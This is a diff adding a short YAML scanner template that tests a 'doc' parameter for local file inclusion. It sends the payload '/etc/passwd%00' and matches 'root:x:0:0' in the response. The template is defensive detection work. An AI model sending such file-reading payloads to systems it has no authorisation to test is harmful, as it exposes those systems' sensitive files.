@@ -1,0 +1,20 @@
+id: lfi-039
+name: 'Path traversal via doc'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/passwd via doc'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      doc:
+        - '/etc/passwd%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
